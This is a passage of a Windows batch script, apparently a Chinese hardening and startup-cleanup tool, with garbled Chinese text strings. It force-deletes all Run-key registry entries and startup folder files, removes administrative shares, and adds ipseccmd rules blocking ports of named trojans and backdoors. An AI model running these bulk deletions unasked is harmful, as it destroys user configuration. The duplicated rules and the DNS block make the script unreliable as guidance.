reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v IgfxTray /f

echo ����ɹ����밴�����������һ�㡭��
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����







:mark15

title ��������������Ŀ 
cls
echo.    ����������Զ��������зǱ�Ҫ��������Ŀ������ǰ���
echo.    ԭ������Ŀ���ݣ�����Ϊc:\windows\���ݵ�������Ŀ.r
echo.    eg������Ҫ��˫�����뼴�ɡ�
pause
reg export HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run c:\windows\1.reg
reg export HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run c:\windows\2.reg
type c:\windows\1.reg >> c:\windows\���ݵ�������Ŀ.reg
type c:\windows\2.reg >> c:\windows\���ݵ�������Ŀ.reg
Del c:\windows\1.reg
Del c:\windows\2.reg
reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /va /f
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /va /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v ctfmon.exe /d C:\WINDOWS\system32\ctfmon.exe
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg" /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v command /d ""C:\WINDOWS\IME\imjp8_1\IMJPMIG.EXE" /Spoil /RemAdvDef /Migration32"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v hkey /d HKLM
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v inimapping /d 0
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v item /d IMJPMIG
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v key /d SOFTWARE\Microsoft\Windows\CurrentVersion\Run

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v command /d "C:\WINDOWS\system32\IME\TINTLGNT\TINTSETP.EXE /IMEName"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v hkey /d HKLM
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v inimapping /d 0
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v item /d TINTSETP
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v key /d SOFTWARE\Microsoft\Windows\CurrentVersion\Run

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v command /d ""C:\WINDOWS\IME\imjp8_1\IMJPMIG.EXE" /Spoil /RemAdvDef /Migration32"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v hkey /d HKLM
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v inimapping /d 0
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v item /d TINTSETP
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v key /d SOFTWARE\Microsoft\Windows\CurrentVersion\Run

Del "C:\Documents and Settings\All Users\����ʼ���˵�\����\����\*.*" /q /f
Del "C:\Documents and Settings\Default User\����ʼ���˵�\����\����\*.*" /q /f
Del "%userprofile%\����ʼ���˵�\����\����\*.*" /q /f
start C:\WINDOWS\pchealth\helpctr\binaries\msconfig.exe
echo ����ɹ����밴�����������һ�㡭��
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����






:mark16
cls
title ɾ��Ĭ�Ϲ���
echo. 
echo ------------------------------------------------------ 
echo. 
echo ��ʼɾ��ÿ�������µ�Ĭ�Ϲ���. 
echo. 
for %%a in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do @(
    if exist %%a:\nul (
        net share %%a$ /delete>nul 2>nul && echo �ɹ�ɾ����Ϊ %%a$ ��Ĭ�Ϲ��� || echo ��Ϊ %%a$ ��Ĭ�Ϲ�������
    ) 
)
net share admin$ /delete>nul 2>nul && echo �ɹ�ɾ����Ϊ admin$ ��Ĭ�Ϲ��� || echo ��Ϊ admin$ ��Ĭ�Ϲ�������
echo.
echo ------------------------------------------------------ 
echo.
net stop Server>nul 2>nul && echo Server������ֹͣ.
net start Server>nul 2>nul && echo Server����������.
echo. 
echo ------------------------------------------------------ 
echo. 
echo �޸�ע����Ը���ϵͳĬ������. 
echo. 
echo ���ڴ���ע����ļ�. 
echo Windows Registry Editor Version 5.00> c:\delshare.reg 
:: ͨ��ע����ֹAdmin$�����Է��������ٴμ���
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters]>> c:\delshare.reg
echo "AutoShareWks"=dword:00000000>> c:\delshare.reg 
echo "AutoShareServer"=dword:00000000>> c:\delshare.reg 
:: ɾ��IPC$������������ҪadministritorȨ�޲��ܳɹ�ɾ��
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa]>> c:\delshare.reg
echo "restrictanonymous"=dword:00000001>> c:\delshare.reg
echo ���ڵ���ע����ļ��Ը���ϵͳĬ������. 
regedit /s c:\delshare.reg 
del c:\delshare.reg && echo ��ʱ�ļ��Ѿ�ɾ��. 
echo. 
echo ------------------------------------------------------ 
echo. 
echo �����Ѿ��ɹ�ɾ�����е�Ĭ�Ϲ���. 
echo. 
pause>nul
goto mark0
exit                    ::��ֹ�����ּ�����







:mark17

cls
title ľ��˿ڷ�ɱ
echo. ��ʼľ��˿ڷ�ɱ
pause

gpupdate >nul
rem For Client only
ipseccmd -w REG -p "HFUT_SECU" -o -x >nul
ipseccmd -w REG -p "HFUT_SECU" -x >nul
rem ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/80" -f *+0:80:TCP -n BLOCK -x >nul
rem ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/1434" -f *+0:1434:UDP -n BLOCK -x >nul
rem ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/137" -f *+0:137:UDP -n BLOCK -x >nul
rem ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/138" -f *+0:138:UDP -n BLOCK -x >nul
rem echo ��ֹ�����ھӵ��ļ����䣨ȥ���������е� REM ������Ч����
rem ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/139" -f *+0:139:TCP -n BLOCK -x >nul 
rem echo ��ֹNetBIOS/SMB������ļ��ʹ�ӡ�������SAMBA��ȥ��REM��Ч��
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/135" -f *+0:135:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/135" -f *+0:135:UDP -n BLOCK -x >nul
echo ��ֹLocation Service����ͷ�ֹ Dos ������������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/445" -f *+0:445:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/445" -f *+0:445:UDP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1025" -f *+0:1025:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/139" -f *+0:139:UDP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1068" -f *+0:1068:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5554" -f *+0:5554:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9995" -f *+0:9995:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9996" -f *+0:9996:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block ICMP/255" -f *+0:255:ICMP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/43958" -f *+0:43958:TCP -n BLOCK -x >nul
echo �ر�����Σ�ն˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20034" -f *+0:20034:TCP -n BLOCK -x >nul
echo �ر�ľ��NetBus Pro���ŵĶ˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1092" -f *+0:1092:TCP -n BLOCK -x >nul
echo �ر����LoveGate���ŵĶ˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/3996" -f *+0:3996:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4060" -f *+0:4060:TCP -n BLOCK -x >nul
echo �ر�ľ��RemoteAnything���ŵĶ˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4590" -f *+0:4590:TCP -n BLOCK -x >nul
echo �ر�ľ��ICQTrojan���ŵĶ˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1080" -f *+0:1080:TCP -n BLOCK -x >nul
echo ��ֹ���������ɨ�衭������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/113" -f *+0:113:TCP -n BLOCK -x >nul
echo ��ֹAuthentication Service���񡭡�����OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/79" -f *+0:79:TCP -n BLOCK -x >nul
echo ��ֹFingerɨ�衭������OK��
ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/53" -f *+0:53:UDP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/53" -f *+0:53:TCP -n BLOCK -x >nul
echo ��ֹ���򴫵ݣ�TCP������ƭDNS��UDP��������������ͨ�š�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/707" -f *+0:707:TCP -n BLOCK -x >nul
echo �ر�nachi��没�������˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/808" -f *+0:808:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23" -f *+0:23:TCP -n BLOCK -x >nul
echo �ر�Telnet ��ľ��Tiny Telnet Server�����˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/520" -f *+0:520:TCP -n BLOCK -x >nul
echo �ر�Rip �˿ڡ�������OK��
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
echo �ر�ľ�����BackDoor��Ĭ�Ϸ���˿ڡ�������OK��
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
echo �ر������ڶ�2001��Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
echo �ر�ľ�����Ripper��Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
echo �ر�ľ�����Wincrash v2��Ĭ�Ϸ���˿ڡ�������OK��
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/3389" -f *+0:3389:TCP -n BLOCK -x >nul
echo �ر�Windows ��Զ�̹����նˣ�Զ�����棩�����˿ڡ�������OK��
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4444" -f *+0:4444:TCP -n BLOCK -x >nul
echo �ر�msblast������������˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4899" -f *+0:4899:TCP -n BLOCK -x >nul
echo �ر�Զ�̿��������remote administrator)����˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5800" -f *+0:5800:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5900" -f *+0:5900:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8888" -f *+0:8888:TCP -n BLOCK -x >nul
echo �ر�Զ�̿������VNC������Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
echo �ر�Dameware�����Ĭ�ϼ����˿ڣ��ɱ䣡����������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6267" -f *+0:6267:TCP -n BLOCK -x >nul
echo �ر�ľ�����Ů����Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/660" -f *+0:660:TCP -n BLOCK -x >nul
echo �ر�ľ��DeepThroat v1.0 - 3.1Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6671" -f *+0:6671:TCP -n BLOCK -x >nul
echo �ر�ľ��IndoctrinationĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6939" -f *+0:6939:TCP -n BLOCK -x >nul
echo �ر�ľ��PRIORITYĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
echo �ر�ľ�����羫��Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7511" -f *+0:7511:TCP -n BLOCK -x >nul
echo �ر�ľ����������Ĭ�����Ӷ˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7626" -f *+0:7626:TCP -n BLOCK -x >nul
echo �ر�ľ�����Ĭ�϶˿�(ע��ɱ䣡)��������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8011" -f *+0:8011:TCP -n BLOCK -x >nul
echo �ر�ľ��WAY2.4Ĭ�Ϸ���˿ڡ�������OK��
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9989" -f *+0:9989:TCP -n BLOCK -x >nul
echo �ر�ľ��InIkillerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/19191" -f *+0:19191:TCP -n BLOCK -x >nul
echo �ر�ľ����ɫ����Ĭ�Ͽ��ŵ�telnet�˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1029" -f *+0:1029:TCP -n BLOCK -x >nul
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20168" -f *+0:20168:TCP -n BLOCK -x >nul
echo �ر�lovegate ��������ŵ��������Ŷ˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23444" -f *+0:23444:TCP -n BLOCK -x >nul
echo �ر�ľ�����繫ţĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/27374" -f *+0:27374:TCP -n BLOCK -x >nul
echo �ر�ľ��SUB7Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30100" -f *+0:30100:TCP -n BLOCK -x >nul
echo �ر�ľ��NetSphereĬ�ϵķ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31337" -f *+0:31337:TCP -n BLOCK -x >nul
echo �ر�ľ��BO2000Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/45576" -f *+0:45576:TCP -n BLOCK -x >nul
echo �رմ�������Ŀ��ƶ˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
echo �ر�ľ��SchwindlerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
echo �ر�ľ��TelecommandoĬ�Ϸ���˿ڡ�������OK!

ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31338" -f *+0:31338:TCP -n BLOCK -x >nul
echo �ر�ľ��Back OrificeĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8102" -f *+0:8102:TCP -n BLOCK -x >nul
echo �ر�ľ��������͵Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2000" -f *+0:2000:TCP -n BLOCK -x >nul
echo �ر�ľ��ڶ�2000Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31339" -f *+0:31339:TCP -n BLOCK -x >nul
echo �ر�ľ��NetSpy DKĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
echo �ر�ľ��ڶ�2001Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31666" -f *+0:31666:TCP -n BLOCK -x >nul
echo �ر�ľ��BOWhackĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/34324" -f *+0:34324:TCP -n BLOCK -x >nul
echo �ر�ľ��BigGluckĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
echo �ر�ľ�����羫��3.0��netspy3.0Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40412" -f *+0:40412:TCP -n BLOCK -x >nul
echo �ر�ľ��The SpyĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40421" -f *+0:40421:TCP -n BLOCK -x >nul
echo �ر�ľ��Masters ParadiseĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8011" -f *+0:8011:TCP -n BLOCK -x >nul
echo �ر�ľ��wry����С�ӣ�����Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40422" -f *+0:40422:TCP -n BLOCK -x >nul
echo �ر�ľ��Masters Paradise 1.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23444" -f *+0:23444:TCP -n BLOCK -x >nul
echo �ر�ľ�����繫ţ��netbullĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40423" -f *+0:40423:TCP -n BLOCK -x >nul
echo �ر�ľ��Masters Paradise 2.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23445" -f *+0:23445:TCP -n BLOCK -x >nul
echo �ر�ľ�����繫ţ��netbullĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40426" -f *+0:40426:TCP -n BLOCK -x >nul
echo �ر�ľ��Masters Paradise 3.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50505" -f *+0:50505:TCP -n BLOCK -x >nul
echo �ر�ľ��Sockets de TroieĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/27374" -f *+0:27374:TCP -n BLOCK -x >nul
echo �ر�ľ��Sub Seven 2.0+��77������ħ��Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
echo �ر�ľ��ForeĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/53001" -f *+0:53001:TCP -n BLOCK -x >nul
echo �ر�ľ��Remote Windows ShutdownĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
echo �ر�ľ��TelecommandoĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/121" -f *+0:121:TCP -n BLOCK -x >nul
echo �ر�ľ��BO jammerkillahVĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
echo �ر�ľ��Satanz BackdoorĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/65000" -f *+0:65000:TCP -n BLOCK -x >nul
echo �ر�ľ��DevilĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
echo �ر�ľ��SilencerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6400" -f *+0:6400:TCP -n BLOCK -x >nul
echo �ر�ľ��The tHingĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1600" -f *+0:1600:TCP -n BLOCK -x >nul
echo �ر�ľ��Shivka-BurkaĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/12346" -f *+0:12346:TCP -n BLOCK -x >nul
echo �ر�ľ��NetBus 1.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1807" -f *+0:1807:TCP -n BLOCK -x >nul
echo �ر�ľ��SpySenderĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20034" -f *+0:20034:TCP -n BLOCK -x >nul
echo �ر�ľ��NetBus ProĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1981" -f *+0:1981:TCP -n BLOCK -x >nul
echo �ر�ľ��ShockraveĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1243" -f *+0:1243:TCP -n BLOCK -x >nul
echo �ر�ľ��SubSevenĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
echo �ر�ľ��WebExĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30100" -f *+0:30100:TCP -n BLOCK -x >nul
echo �ر�ľ��NetSphereĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1011" -f *+0:1011:TCP -n BLOCK -x >nul
echo �ر�ľ��Doly TrojanĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
echo �ر�ľ��SilencerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1170" -f *+0:1170:TCP -n BLOCK -x >nul
echo �ر�ľ��Psyber Stream ServerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20000" -f *+0:20000:TCP -n BLOCK -x >nul
echo �ر�ľ��MilleniumĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1234" -f *+0:1234:TCP -n BLOCK -x >nul
echo �ر�ľ��Ultors TrojanĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/65000" -f *+0:65000:TCP -n BLOCK -x >nul
echo �ر�ľ��Devil 1.03Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
echo �ر�ľ��VooDoo DollĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
echo �ر�ľ��NetMonitorĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1492" -f *+0:1492:TCP -n BLOCK -x >nul
echo �ر�ľ��FTP99CMPĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1170" -f *+0:1170:TCP -n BLOCK -x >nul
echo �ر�ľ��Streaming Audio TrojanĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
echo �ر�ľ��BackDoorĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30303" -f *+0:30303:TCP -n BLOCK -x >nul
echo �ر�ľ��Socket23Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
echo �ر�ľ��Trojan CowĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
echo �ر�ľ��GatecrasherĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
echo �ر�ľ��RipperĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
echo �ر�ľ��TelecommandoĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2115" -f *+0:2115:TCP -n BLOCK -x >nul
echo �ر�ľ��BugsĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/12076" -f *+0:12076:TCP -n BLOCK -x >nul
echo �ر�ľ��GjamerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2140" -f *+0:2140:TCP -n BLOCK -x >nul
echo �ر�ľ��Deep ThroatĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4950" -f *+0:4950:TCP -n BLOCK -x >nul
echo �ر�ľ��IcqTrojenĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2140" -f *+0:2140:TCP -n BLOCK -x >nul
echo �ر�ľ��The InvasorĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/16969" -f *+0:16969:TCP -n BLOCK -x >nul
echo �ر�ľ��PriotrityĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2801" -f *+0:2801:TCP -n BLOCK -x >nul
echo �ر�ľ��Phineas PhuckerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
echo �ر�ľ��VodooĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30129" -f *+0:30129:TCP -n BLOCK -x >nul
echo �ر�ľ��Masters ParadiseĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5742" -f *+0:5742:TCP -n BLOCK -x >nul
echo �ر�ľ��WincrashĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/3700" -f *+0:3700:TCP -n BLOCK -x >nul
echo �ر�ľ��Portal of DoomĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
echo �ر�ľ��Wincrash2Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4092" -f *+0:4092:TCP -n BLOCK -x >nul
echo �ر�ľ��WinCrashĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1033" -f *+0:1033:TCP -n BLOCK -x >nul
echo �ر�ľ��NetspyĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4590" -f *+0:4590:TCP -n BLOCK -x >nul
